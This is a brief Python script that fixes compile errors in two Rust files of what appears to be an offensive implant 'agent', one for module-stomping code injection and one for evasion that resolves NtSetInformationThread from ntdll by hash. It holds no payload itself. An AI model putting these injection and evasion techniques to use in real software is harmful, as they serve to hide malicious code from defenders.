# Fix module_stomp.rs imports and type correctly
with open("agent/src/injection/module_stomp.rs", "r") as f:
    c = f.read()
# Revert that stupid replace everywhere
c = c.replace("type NtHeaders = IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER;", "type NtHeaders = IMAGE_NT_HEADERS64;")
c = c.replace("use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER,  };", "use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER};")
with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(c)

with open("agent/src/evasion.rs", "r") as f:
    c = f.read()
c = c.replace("let func = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTSETINFORMATIONTHREAD)", "let func: *mut winapi::ctypes::c_void = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTSETINFORMATIONTHREAD)")
with open("agent/src/evasion.rs", "w") as f:
    f.write(c)

